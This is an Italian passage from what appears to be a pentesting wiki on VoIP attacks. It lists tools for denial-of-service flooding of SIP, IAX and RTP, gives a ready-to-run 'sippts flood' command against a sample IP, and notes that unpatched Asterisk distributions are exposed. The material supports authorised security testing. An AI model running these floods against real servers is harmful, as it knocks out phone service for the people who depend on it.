### DoS

Ci sono diversi modi per cercare di ottenere DoS nei server VoIP.

- **`SIPPTS flood`** da [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood invia messaggi illimitati al bersaglio.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** da [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping effettua un ping SIP per vedere il tempo di risposta del server.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protocollo IAX utilizzato da Asterisk.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uno strumento per eseguire flooding di messaggi SIP/SDP INVITE su UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Invia diversi pacchetti RTP ben formati. È necessario conoscere le porte RTP che vengono utilizzate (sniff prima).
- [**SIPp**](https://github.com/SIPp/sipp): Consente di analizzare e generare traffico SIP, quindi può essere utilizzato anche per DoS.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Il coltellino svizzero SIP. Può anche essere utilizzato per eseguire attacchi SIP.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilità del sistema operativo

Il modo più semplice per installare un software come Asterisk è scaricare una **distribuzione OS** che lo ha già installato, come: **FreePBX, Elastix, Trixbox**... Il problema con questi è che una volta che funziona, gli amministratori di sistema potrebbero **non aggiornarli più** e le **vulnerabilità** verranno scoperte col tempo.

## Riferimenti

- [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
- [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
- [http://blog.pepelux.org/](http://blog.pepelux.org/)
- [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
- [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
- [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{{#include ../../banners/hacktricks-training.md}}
